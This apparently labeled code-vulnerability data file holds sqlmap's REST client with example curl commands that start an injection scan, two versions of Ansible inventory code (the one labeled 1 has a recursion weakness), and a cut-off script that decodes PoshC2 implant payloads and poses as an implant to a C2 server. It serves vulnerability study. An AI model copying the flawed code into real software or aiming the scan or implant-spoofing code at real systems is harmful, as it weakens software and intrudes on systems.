    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == ""gevent"":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == ""eventlet"":
            import eventlet
            eventlet.monkey_patch()
        logger.debug(""Using adapter '%s' to run bottle"" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if ""already in use"" in getSafeExString(ex):
            logger.error(""Address already in use ('%s:%s')"" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = ""Adapter '%s' is not available on this system"" % adapter
        if adapter in (""gevent"", ""eventlet""):
            errMsg += "" (e.g.: 'sudo apt-get install python-%s')"" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug(""Calling %s"" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error(""Failed to load and parse %s"" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """"""
    REST-JSON API client
    """"""

    dbgMsg = ""Example client access from command line:""
    dbgMsg += ""\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid"" % (host, port)
    dbgMsg += ""\n\t$ curl -H \""Content-Type: application/json\"" -X POST -d '{\""url\"": \""http://testphp.vulnweb.com/artists.php?artist=1\""}' http://%s:%d/scan/$taskid/start"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/data"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/log"" % (host, port)
    logger.debug(dbgMsg)

    addr = ""http://%s:%d"" % (host, port)
    logger.info(""Starting REST-JSON API client to '%s'..."" % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = ""There has been a problem while connecting to the ""
            errMsg += ""REST-JSON API server at '%s' "" % addr
            errMsg += ""(%s)"" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info(""Type 'help' or '?' for list of available commands"")

    while True:
        try:
            command = raw_input(""api%s> "" % ("" (%s)"" % taskid if taskid else """")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in (""data"", ""log"", ""status"", ""stop"", ""kill""):
            if not taskid:
                logger.error(""No task ID in use"")
                continue
            raw = _client(""%s/scan/%s/%s"" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            dataToStdout(""%s\n"" % raw)

        elif command.startswith(""new""):
            if ' ' not in command:
                logger.error(""Program arguments are missing"")
                continue

            argv = [""sqlmap.py""] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client(""%s/task/new"" % addr)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to create new task"")
                continue
            taskid = res[""taskid""]
            logger.info(""New task ID is '%s'"" % taskid)

            raw = _client(""%s/scan/%s/start"" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to start scan"")
                continue
            logger.info(""Scanning started"")

        elif command.startswith(""use""):
            taskid = (command.split()[1] if ' ' in command else """").strip(""'\"""")
            if not taskid:
                logger.error(""Task ID is missing"")
                taskid = None
                continue
            elif not re.search(r""\A[0-9a-fA-F]{16}\Z"", taskid):
                logger.error(""Invalid task ID '%s'"" % taskid)
                taskid = None
                continue
            logger.info(""Switching to task ID '%s' "" % taskid)

        elif command in (""list"", ""flush""):
            raw = _client(""%s/admin/%s/%s"" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            elif command == ""flush"":
                taskid = None
            dataToStdout(""%s\n"" % raw)

        elif command in (""exit"", ""bye"", ""quit"", 'q'):
            return

        elif command in (""help"", ""?""):
            msg =  ""help        Show this help message\n""
            msg += ""new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \""http://testphp.vulnweb.com/artists.php?artist=1\""')\n""
            msg += ""use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n""
            msg += ""data        Retrieve and show data for current task\n""
            msg += ""log         Retrieve and show log for current task\n""
            msg += ""status      Retrieve and show status for current task\n""
            msg += ""stop        Stop current task\n""
            msg += ""kill        Kill current task\n""
            msg += ""list        Display all tasks\n""
            msg += ""flush       Flush tasks (delete all tasks)\n""
            msg += ""exit        Exit this client\n""

            dataToStdout(msg)

        elif command:
            logger.error(""Unknown command '%s'"" % command)
/n/n/n",1
40,40,153c9bd539eeffdd6d395b8840f95d56e3814f27,"lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError

from itertools import chain


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    def _walk_relationship(self, rel):
        '''
        Given `rel` that is an iterable property of Group,
        consitituting a directed acyclic graph among all groups,
        Returns a set of all groups in full tree
        A   B    C
        |  / |  /
        | /  | /
        D -> E
        |  /    vertical connections
        | /     are directed upward
        F
        Called on F, returns set of (A, B, C, D, E)
        '''
        seen = set([])
        unprocessed = set(getattr(self, rel))

        while unprocessed:
            seen.update(unprocessed)
            unprocessed = set(chain.from_iterable(
                getattr(g, rel) for g in unprocessed
            ))
            unprocessed.difference_update(seen)

        return seen

    def get_ancestors(self):
        return self._walk_relationship('parent_groups')

    def get_descendants(self):
        return self._walk_relationship('child_groups')

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:

            # prepare list of group's new ancestors this edge creates
            start_ancestors = group.get_ancestors()
            new_ancestors = self.get_ancestors()
            if group in new_ancestors:
                raise AnsibleError(
                    ""Adding group '%s' as child to '%s' creates a recursive ""
                    ""dependency loop."" % (group.name, self.name))
            new_ancestors.add(self)
            new_ancestors.difference_update(start_ancestors)

            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors(additions=new_ancestors)

            self.clear_hosts_cache()

    def _check_children_depth(self):

        depth = self.depth
        start_depth = self.depth  # self.depth could change over loop
        seen = set([])
        unprocessed = set(self.child_groups)

        while unprocessed:
            seen.update(unprocessed)
            depth += 1
            to_process = unprocessed.copy()
            unprocessed = set([])
            for g in to_process:
                if g.depth < depth:
                    g.depth = depth
                    unprocessed.update(g.child_groups)
            if depth - start_depth > len(seen):
                raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.get_ancestors():
            g._hosts_cache = None

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.get_descendants():
            kid_hosts = kid.hosts
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/nlib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self, additions=None):
        # populate ancestors
        if additions is None:
            for group in self.groups:
                self.add_group(group)
        else:
            for group in additions:
                if group not in self.groups:
                    self.groups.append(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.groups.append(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/ntest/units/plugins/inventory/test_group.py/n/n# Copyright 2018 Alan Rominger <arominge@redhat.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

from ansible.compat.tests import unittest

from ansible.inventory.group import Group
from ansible.inventory.host import Host
from ansible.errors import AnsibleError


class TestGroup(unittest.TestCase):

    def test_depth_update(self):
        A = Group('A')
        B = Group('B')
        Z = Group('Z')
        A.add_child_group(B)
        A.add_child_group(Z)
        self.assertEqual(A.depth, 0)
        self.assertEqual(Z.depth, 1)
        self.assertEqual(B.depth, 1)

    def test_depth_update_dual_branches(self):
        alpha = Group('alpha')
        A = Group('A')
        alpha.add_child_group(A)
        B = Group('B')
        A.add_child_group(B)
        Z = Group('Z')
        alpha.add_child_group(Z)
        beta = Group('beta')
        B.add_child_group(beta)
        Z.add_child_group(beta)

        self.assertEqual(alpha.depth, 0)  # apex
        self.assertEqual(beta.depth, 3)  # alpha -> A -> B -> beta

        omega = Group('omega')
        omega.add_child_group(alpha)

        # verify that both paths are traversed to get the max depth value
        self.assertEqual(B.depth, 3)  # omega -> alpha -> A -> B
        self.assertEqual(beta.depth, 4)  # B -> beta

    def test_depth_recursion(self):
        A = Group('A')
        B = Group('B')
        A.add_child_group(B)
        # hypothetical of adding B as child group to A
        A.parent_groups.append(B)
        B.child_groups.append(A)
        # can't update depths of groups, because of loop
        with self.assertRaises(AnsibleError):
            B._check_children_depth()

    def test_loop_detection(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        A.add_child_group(B)
        B.add_child_group(C)
        with self.assertRaises(AnsibleError):
            C.add_child_group(A)

    def test_populates_descendant_hosts(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        h = Host('h')
        C.add_host(h)
        A.add_child_group(B)  # B is child of A
        B.add_child_group(C)  # C is descendant of A
        A.add_child_group(B)
        self.assertEqual(set(h.groups), set([C, B, A]))
        h2 = Host('h2')
        C.add_host(h2)
        self.assertEqual(set(h2.groups), set([C, B, A]))

    def test_ancestor_example(self):
        # see docstring for Group._walk_relationship
        groups = {}
        for name in ['A', 'B', 'C', 'D', 'E', 'F']:
            groups[name] = Group(name)
        # first row
        groups['A'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['E'])
        groups['C'].add_child_group(groups['D'])
        # second row
        groups['D'].add_child_group(groups['E'])
        groups['D'].add_child_group(groups['F'])
        groups['E'].add_child_group(groups['F'])

        self.assertEqual(
            set(groups['F'].get_ancestors()),
            set([
                groups['A'], groups['B'], groups['C'], groups['D'], groups['E']
            ])
        )

    def test_ancestors_recursive_loop_safe(self):
        '''
        The get_ancestors method may be referenced before circular parenting
        checks, so the method is expected to be stable even with loops
        '''
        A = Group('A')
        B = Group('B')
        A.parent_groups.append(B)
        B.parent_groups.append(A)
        # finishes in finite time
        self.assertEqual(A.get_ancestors(), set([A, B]))
/n/n/n",0
41,41,153c9bd539eeffdd6d395b8840f95d56e3814f27,"/lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:
            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors()

            self.clear_hosts_cache()

    def _check_children_depth(self):

        try:
            for group in self.child_groups:
                group.depth = max([self.depth + 1, group.depth])
                group._check_children_depth()
        except RuntimeError:
            raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.parent_groups:
            g.clear_hosts_cache()

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.child_groups:
            kid_hosts = kid.get_hosts()
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def _get_ancestors(self):

        results = {}
        for g in self.parent_groups:
            results[g.name] = g
            results.update(g._get_ancestors())
        return results

    def get_ancestors(self):

        return self._get_ancestors().values()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/n/lib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self):
        # populate ancestors
        for group in self.groups:
            self.add_group(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.add_group(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/n",1
180,180,e523c6418720a20eb247111d21424752f6994ee0,"posh-hunter.py/n/n#!/usr/bin/env python
# Find, monitor and troll a PoshC2 server

import zlib, argparse, os, sys, re, requests, subprocess, datetime, time, base64

class PoshC2Payload:
  
  filepath = None
  useragent = None
  secondstage = None
  encryptionkey = None

  def __init__( self, path ):
    if not os.path.isfile( path ):
      print path + ' isn\'t a file'

    self.filepath = path

  # Attempt to pull info out of implant payload
  def analyse( self ):
    print 'Analysing ' + self.filepath + '...'

    with open( self.filepath, 'rb' ) as f:
      decoded = PoshC2Payload.base64_walk( f.read() )
  
    # print decoded

    # Get custom headers
    headernames = [
      'User-Agent',
      'Host',
      'Referer'
    ]
    self.headers = {}
    for h in headernames:
      m = re.search( h + '"",""([^""]*)""', decoded, re.IGNORECASE )
      if m:
        print h + ': ' + m.group(1)
        self.headers[h] = m.group(1)

    # Get host header
    m = re.search('\$h=""([^""]*)""', decoded )
    if m:
      self.headers['Host'] = m.group(1)
      print 'Host header: ' + m.group(1)

    # Get second stage URL
    m = re.search('\$s=""([^""]*)""', decoded )
    if m:
      self.secondstage = m.group(1)
      print 'Second stage URL: ' + self.secondstage
    
    # Get encryption key
    m = re.search('-key ([/+a-z0-9A-Z]*=*)', decoded )
    if m:
      self.encryptionkey = m.group(1)
      print 'Encryption key: ' + self.encryptionkey

    c2 = PoshC2Server()
    c2.key = self.encryptionkey
    c2.useragent = self.headers['User-Agent']
    return c2

  # Recursively attempt to extract and decode base64
  @staticmethod
  def base64_walk( data ):

    # data = data.decode('utf-16le').encode('utf-8')

    # Convert by stripping zero bytes, lol
    s = ''
    for c in data:
      if ord( c ) != 0:
        s += c
    data = s
    # print ''
    # print 'Attempting to get data from: ' + data

    # Find all base64 strings
    m = re.findall( r'[+/0-9a-zA-Z]{20,}=*', data )
    
    if len( m ) == 0:
      print 'No more base64 found'
      return data

    # Join into one string
    b64 = ''.join(m)
    # print 'Found: ' + b64
    
    decoded = base64.b64decode( b64 )

    # Deflated?
    decompress = zlib.decompressobj(
      -zlib.MAX_WBITS  # see above
    )
    try:
      d = decompress.decompress( decoded )
      if d:
        print 'Data is compressed'
        decoded = d
    except:
      print 'Data is not compressed'

    # Check if the data now contains a user agent, URL 
    m = re.search(r'user-agent',decoded,re.IGNORECASE)
    if m:
      return decoded
    
    return PoshC2Payload.base64_walk( decoded )


class PoshC2Server:

  host = None
  hostheader = None
  key = None
  useragent = None
  referer = None
  cookie = None
  pid = None
  username = None
  domain = None
  debug = False
  sleeptime = 5

  def __init__( self, host=None, hostheader=None ):
    
    self.session = requests.Session()
    self.host = host
    if not hostheader:
      self.hostheader = host
    else:
      self.hostheader = hostheader

  def do_request( self, url, data=None ):
   

    self.debug = False

    # def do_request( self, path, method='GET', data=None, files=None, returnformat='json', savefile=None ):
    headers = {
      'Host': self.hostheader,
      'Referer': self.referer,
      'User-Agent': self.useragent,
      'Cookie': self.cookie
    
    }
    # print headers

    import warnings
    with warnings.catch_warnings():
      warnings.simplefilter(""ignore"")
      try:
        if data:
          response = self.session.post(url, data=data, headers=headers, verify=False ) # , files=files, stream=stream )
        else:
          response = self.session.get(url, headers=headers, verify=False )
      except:
        e = sys.exc_info()[1]
        print 'Request failed: ' + str( e ), 'fail' 
        return False

    if self.debug: 
      print response
      print response.text   
    if response.status_code == 200:
      return response.text
    self.error = response
    if self.debug:
      print self.error
    return False

  def get_encryption( self, iv='0123456789ABCDEF' ):
    from Crypto.Cipher import AES
    # print 'IV: ', iv
    aes = AES.new( base64.b64decode(self.key), AES.MODE_CBC, iv )
    return aes

  # Encrypt a string and base64 encode it
  def encrypt( self, data, gzip=False ):
    # function ENC ($key,$un){
    # $b = [System.Text.Encoding]::UTF8.GetBytes($un)
    # $a = CAM $key
    # $e = $a.CreateEncryptor()
    # $f = $e.TransformFinalBlock($b, 0, $b.Length)
    # [byte[]] $p = $a.IV + $f
    # [System.Convert]::ToBase64String($p)
    # }

    if gzip:
      print 'Gzipping data - pre-zipped len, ' + str(len(data))
      import StringIO
      import gzip
      out = StringIO.StringIO()
      with gzip.GzipFile(fileobj=out, mode=""w"") as f:
        f.write(data)
      data = out.getvalue() 

    # Pad with zeros
    mod = len(data) % 16
    if mod != 0:
      newlen = len(data) + (16-mod)
      data = data.ljust( newlen, '\0' )
    aes = self.get_encryption()
    # print 'Data len: ' + str(len(data))
    data = aes.IV + aes.encrypt( data )
    if not gzip:
      data = base64.b64encode( data )
    return data

  # Decrypt a string from base64 encoding 
  def decrypt( self, data, gzip=False ):
    # iv is first 16 bytes of cipher
    print data
    iv = data[0:16]
    # data = data[16:]
    # print 'IV length: ' + str(len(iv))
    aes = self.get_encryption(iv)
    if not gzip:
      data = base64.b64decode(data)
    data =  aes.decrypt( data )
    if gzip:
      print 'Gunzipping data - pre-zipped len, ' + str(len(data))
      import StringIO
      import gzip
      infile = StringIO.StringIO(data)
      with gzip.GzipFile(fileobj=infile, mode=""r"") as f:
        data = f.read()
    return data[16:]
  
  def setcookie( self, value=None ):
    if value:
      c = value
    else:
    # $o=""$env:userdomain\$u;$u  ;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;http://172.16.88.221""
      if not self.pid:
        import random
        self.pid = random.randrange(300,9999)
      c = self.domain + '\\'
      c += self.username + ';'
      c += self.username + ';' 
      c += self.machine + ';AMD64;' 
      c += str( self.pid ) + ';' 
      c += self.host
    print c
    self.cookie = 'SessionId=' + self.encrypt( c )
    # print self.cookie

  # Get the second stage
  def secondstage( self, url, interact=False ):
    
    # $o=""$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;https://172.16.88.221""
    # $pp=enc -key sBOGMbI+wTzxiN9H8q8y8YFBuD/KGsmvCnwRhDjPVXE= -un $o
    # $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
    self.host = '/'.join(url.split('/')[0:3])
    self.setcookie()
    data = self.do_request( url )
    data = self.decrypt( data )

    print data

    # Get encryption key, URL
    m = re.search( r'\$key *= *""([^""]+)""', data )
    if m:
      print 'Comms encryption key: ' + m.group(1)
      self.key = m.group(1)
    m = re.search(r'\$Server *= *""([^""]+)""', data )
    if m:
      print 'Comms URL: ' + m.group(1)
      self.commsurl = m.group(1)
    m = re.search(r'\$sleeptime *= *([0-9]+)', data )
    if m:
      print 'Sleep time: ' + m.group(1)
      self.sleeptime = int(m.group(1))

    if not interact: return True
    
    self.listen( self.commsurl )

  def getimgdata( self, data ):
    # Just use one image because we don't care
